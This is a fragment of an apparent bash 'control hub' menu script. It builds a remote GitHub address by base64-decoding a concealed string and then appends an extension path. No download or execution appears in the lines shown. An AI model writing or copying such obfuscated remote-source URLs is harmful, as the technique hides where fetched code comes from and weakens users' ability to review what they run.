...
URL="$(printf '%s' 'aHR0cHM6Ly9naXRodWIuY29tL0hBUFBZLU5PREUvSEFQUFktQ01EL21haW4=' | base64 -d 2>/dev/null || printf '%s' 'aHR0cHM6Ly9naXRodWIuY29tL0hBUFBZLU5PREUvSEFQUFktQ01EL21haW4=' | base64 --decode)/thame/Extension"
selected_indices=()
...
get_title() { echo '◆ HAPPY-NODE CONTROL HUB ◆'; }
